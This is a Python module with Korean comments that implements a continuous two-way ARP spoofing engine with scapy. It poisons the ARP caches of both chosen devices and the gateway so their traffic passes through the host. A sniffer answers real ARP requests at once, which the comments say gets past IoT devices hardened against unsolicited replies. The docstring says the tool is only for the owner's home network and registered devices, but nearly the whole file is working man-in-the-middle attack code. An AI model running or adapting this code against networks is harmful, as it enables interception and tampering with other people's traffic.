"""
등록된 기기에 한해서만 ARP 스푸핑을 수행한다.

동작 원리:
- 대상 기기에게는 "내가 게이트웨이다"라고 알리는 ARP reply를 주기적으로 보낸다.
- 게이트웨이에게는 "내가 그 기기다"라고 알리는 ARP reply를 주기적으로 보낸다.
  (양방향 스푸핑을 해야 응답 트래픽도 우리 쪽을 거쳐서 실제로 전달할 수 있다.
   대상 기기 -> 우리 -> 실제 목적지로 라우팅해줘야 하므로 IP 포워딩도 활성화한다.)
- Windows에는 raw L2 접근을 위해 Npcap 드라이버가 필요하다 (scapy가 그걸 사용).

주의: 이 모듈은 자신이 관리자로서 소유/운영하는 자기 집 네트워크에서,
자신이 등록한 자신의 기기에 대해서만 사용하도록 설계되어 있다.
devices.json에 등록되지 않은 기기는 절대 대상이 되지 않는다.
"""

from __future__ import annotations

import logging
import threading
import time
from dataclasses import dataclass
from typing import Callable

logger = logging.getLogger("arp_engine")

try:
    import scapy  # type: ignore
    from scapy.all import (  # type: ignore
        ARP,
        AsyncSniffer,
        Ether,
        conf,
        get_if_addr,
        get_if_hwaddr,
        send,
        srp,
    )

    logger.info(
        "scapy 버전: %s / AsyncSniffer 사용 가능: %s",
        getattr(scapy, "VERSION", "알 수 없음"),
        AsyncSniffer is not None,
    )
except ImportError:  # scapy/Npcap 미설치 환경에서도 이 모듈만은 import 가능하게
    ARP = Ether = conf = AsyncSniffer = None  # type: ignore

    def get_if_hwaddr(*_a, **_k):  # type: ignore
        raise RuntimeError("scapy가 설치되어 있지 않습니다.")

    def get_if_addr(*_a, **_k):  # type: ignore
        raise RuntimeError("scapy가 설치되어 있지 않습니다.")

    def send(*_a, **_k):  # type: ignore
        raise RuntimeError("scapy가 설치되어 있지 않습니다.")

    def srp(*_a, **_k):  # type: ignore
        raise RuntimeError("scapy가 설치되어 있지 않습니다.")


def _send_arp_reply(*, dst_ip: str, dst_mac: str, spoofed_src_ip: str, src_mac: str) -> None:
    """"spoofed_src_ip는 src_mac의 것이다"라고 주장하는 ARP reply를 dst_mac에게 보낸다."""
    send(
        ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=spoofed_src_ip, hwsrc=src_mac),
        verbose=False,
    )


@dataclass
class ArpSpoofTarget:
    name: str
    ip: str
    mac: str


class ArpSpoofWorker:
    """기기 하나를 대상으로 하는 지속적 ARP 스푸핑 스레드."""

    def __init__(
        self,
        target: ArpSpoofTarget,
        gateway_ip: str,
        interval_sec: float = 2.0,
        on_error: Callable[[str], None] | None = None,
    ):
        self.target = target
        self.gateway_ip = gateway_ip
        self.interval_sec = interval_sec
        self.on_error = on_error or (lambda msg: None)
        self._stop_event = threading.Event()
        self._thread: threading.Thread | None = None
        self._my_mac: str | None = None
        self._gateway_mac: str | None = None
        self._sniffer: AsyncSniffer | None = None  # type: ignore[valid-type]

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._run, daemon=True, name=f"arp-{self.target.name}"
        )
        self._thread.start()
        logger.info("ARP 스푸핑 시작: %s (%s)", self.target.name, self.target.ip)

    def stop(self, restore: bool = True) -> None:
        self._stop_event.set()
        self._stop_active_reply_sniffer()
        if self._thread:
            self._thread.join(timeout=5)
        if restore:
            self._restore()
        logger.info("ARP 스푸핑 중단: %s (%s)", self.target.name, self.target.ip)

    def _on_arp_packet(self, packet) -> None:
        """대상 기기나 게이트웨이가 실제로 ARP 요청을 보내는 순간을 엿듣다가,
        그 자리에서 바로 답해준다.

        일부 IoT Wi-Fi 모듈은 자기가 요청하지 않은(gratuitous) ARP 응답은
        무시하도록 하드닝되어 있어서, 2초 주기로 일방적으로 광고만 하는
        방식으로는 씨알도 안 먹힐 수 있다. "누가 물어보면 즉시 답한다"는
        이 방식이 정석적인 ARP 스푸핑 구현이고, 하드닝된 기기에도 통한다.
        """
        try:
            if packet.op != 1:  # who-has 요청만 상대한다
                return
            if packet.pdst == self.gateway_ip and packet.psrc == self.target.ip:
                # 대상 기기가 "게이트웨이 어디 있어?" 라고 물어봄 -> 즉시 답한다
                _send_arp_reply(
                    dst_ip=self.target.ip,
                    dst_mac=self.target.mac,
                    spoofed_src_ip=self.gateway_ip,
                    src_mac=self._my_mac,
                )
                logger.info(
                    "ARP 요청 실시간 응답 (%s): 기기가 게이트웨이를 물어봐서 즉시 답변",
                    self.target.name,
                )
            elif packet.pdst == self.target.ip and packet.psrc == self.gateway_ip:
                # 게이트웨이가 "대상 기기 어디 있어?" 라고 물어봄 -> 즉시 답한다
                _send_arp_reply(
                    dst_ip=self.gateway_ip,
                    dst_mac=self._gateway_mac,
                    spoofed_src_ip=self.target.ip,
                    src_mac=self._my_mac,
                )
        except Exception as e:  # noqa: BLE001
            logger.warning("ARP 요청 실시간 응답 실패 (%s): %s", self.target.name, e)

    def _start_active_reply_sniffer(self) -> None:
        if AsyncSniffer is None:
            logger.warning(
                "AsyncSniffer를 사용할 수 없습니다 (%s) — scapy 버전이 이를 지원하지 "
                "않을 수 있습니다. ARP 요청 실시간 응답 없이 주기적 광고만 동작합니다.",
                self.target.name,
            )
            return
        try:
            self._sniffer = AsyncSniffer(
                filter="arp", prn=self._on_arp_packet, store=False
            )
            self._sniffer.start()
            logger.info("ARP 요청 실시간 감시 시작: %s", self.target.name)
        except Exception as e:  # noqa: BLE001
            logger.warning("ARP 요청 실시간 감시 시작 실패 (%s): %s", self.target.name, e)
            self._sniffer = None

    def _stop_active_reply_sniffer(self) -> None:
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:  # noqa: BLE001
                pass
            self._sniffer = None

    def _resolve_mac(self, ip: str, retries: int = 3) -> str | None:
        for _ in range(retries):
            answered, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2,
                verbose=False,
            )
            if answered:
                return answered[0][1].hwsrc
        return None

    def _initialize(self) -> bool:
        """MAC 주소들을 확인한다. 실패하면 on_error로 알리고 False를 반환한다."""
        try:
            self._my_mac = get_if_hwaddr(conf.iface)
            self._gateway_mac = self._resolve_mac(self.gateway_ip)
        except Exception as e:  # noqa: BLE001
            self._report_error(
                f"ARP 스푸핑 초기화 실패 ({self.target.name}): {e} — Npcap이 설치되어 "
                "있는지 확인해주세요 (npcap.com, 'WinPcap API-compatible Mode' 체크 필요)."
            )
            return False

        if not self._gateway_mac:
            self._report_error(
                f"게이트웨이({self.gateway_ip}) MAC을 확인하지 못했습니다 — Npcap이 "
                f"설치되어 있는지, 게이트웨이 IP({self.gateway_ip})가 맞는지 확인해주세요."
            )
            return False

        # scapy가 여러 네트워크 어댑터(Docker/VPN 가상 어댑터 포함) 중 어떤 걸
        # 기본으로 골랐는지 확인한다. 실제 공유기가 있는 네트워크와 다른
        # 어댑터를 고르면, ARP 전송 자체는 에러 없이 "성공"하지만 패킷이
        # 엉뚱한 곳으로 나가서 기기가 영영 못 받는다 — 이게 그 경우인지
        # 로그로 바로 판단할 수 있게 남긴다.
        try:
            iface_ip = get_if_addr(conf.iface)
            logger.info(
                "scapy가 선택한 네트워크 어댑터 (%s): %s (IP: %s) — 게이트웨이(%s)와 "
                "같은 대역이 아니면 어댑터가 잘못 선택된 것입니다.",
                self.target.name,
                conf.iface,
                iface_ip,
                self.gateway_ip,
            )
        except Exception as e:  # noqa: BLE001
            logger.warning("네트워크 어댑터 정보 확인 실패 (%s): %s", self.target.name, e)

        self._start_active_reply_sniffer()

        return True

    def _report_error(self, message: str) -> None:
        logger.error(message)
        self.on_error(message)

    def _run(self) -> None:
        if conf is None:
            self._report_error("scapy 미설치: ARP 스푸핑을 실행할 수 없습니다.")
            return

        if not self._initialize():
            return

        logger.info(
            "ARP 스푸핑 초기화 완료 (%s): 내 MAC=%s, 게이트웨이 MAC=%s — 매 %.0f초 전송",
            self.target.name,
            self._my_mac,
            self._gateway_mac,
            self.interval_sec,
        )

        cycle_count = 0
        # 실패할 때만 경고가 뜨는 구조라, 조용하면 "잘 되고 있는 건지 아무것도
        # 안 하고 있는 건지" 구분이 안 됐다. 매 사이클마다 로그를 남기면
        # 너무 시끄러우니, 대략 1분에 한 번씩만 "살아있다"는 걸 남긴다.
        confirm_every = max(1, round(60 / self.interval_sec))

        while not self._stop_event.is_set():
            try:
                self._spoof_once()
                cycle_count += 1
                if cycle_count % confirm_every == 0:
                    logger.info(
                        "ARP 스푸핑 정상 동작 중 (%s): 지금까지 %d회 전송",
                        self.target.name,
                        cycle_count,
                    )
            except Exception as e:  # noqa: BLE001
                logger.warning("ARP 패킷 전송 실패 (%s): %s", self.target.name, e)
            self._stop_event.wait(self.interval_sec)

    def _spoof_once(self) -> None:
        # 대상 기기에게: "게이트웨이 IP는 나(우리 PC)의 MAC이다"
        _send_arp_reply(
            dst_ip=self.target.ip,
            dst_mac=self.target.mac,
            spoofed_src_ip=self.gateway_ip,
            src_mac=self._my_mac,
        )
        # 게이트웨이에게: "대상 기기 IP는 나(우리 PC)의 MAC이다"
        _send_arp_reply(
            dst_ip=self.gateway_ip,
            dst_mac=self._gateway_mac,
            spoofed_src_ip=self.target.ip,
            src_mac=self._my_mac,
        )

    def _restore(self) -> None:
        """정상적인 ARP 매핑으로 되돌린다 (스푸핑 이전 상태 복구)."""
        if conf is None or not self._gateway_mac:
            return
        try:
            for _ in range(5):
                # 대상 기기에게: 게이트웨이의 진짜 MAC을 다시 알려준다
                _send_arp_reply(
                    dst_ip=self.target.ip,
                    dst_mac=self.target.mac,
                    spoofed_src_ip=self.gateway_ip,
                    src_mac=self._gateway_mac,
                )
                # 게이트웨이에게: 대상 기기의 진짜 MAC을 다시 알려준다
                _send_arp_reply(
                    dst_ip=self.gateway_ip,
                    dst_mac=self._gateway_mac,
                    spoofed_src_ip=self.target.ip,
                    src_mac=self.target.mac,
                )
                time.sleep(0.2)
        except Exception as e:  # noqa: BLE001
            logger.warning("ARP 복구 실패 (%s): %s", self.target.name, e)


class ArpEngine:
    """여러 기기의 ArpSpoofWorker를 관리한다."""

    def __init__(self, gateway_ip: str, on_error: Callable[[str], None] | None = None):
        self.gateway_ip = gateway_ip
        self.on_error = on_error or (lambda msg: None)
        self._workers: dict[str, ArpSpoofWorker] = {}

    def sync(self, targets: list[ArpSpoofTarget]) -> None:
        """devices.json의 enabled 목록과 현재 실행 중인 워커를 맞춘다."""
        wanted = {t.mac: t for t in targets}

        # enabled 해제되었거나 삭제된 기기 -> 중단
        for mac in list(self._workers.keys()):
            if mac not in wanted:
                self._workers.pop(mac).stop(restore=True)

        # 새로 enabled 된 기기 -> 시작
        for mac, target in wanted.items():
            if mac not in self._workers:
                worker = ArpSpoofWorker(target, self.gateway_ip, on_error=self.on_error)
                self._workers[mac] = worker
                worker.start()

    def stop_all(self) -> None:
        for worker in self._workers.values():
            worker.stop(restore=True)
        self._workers.clear()
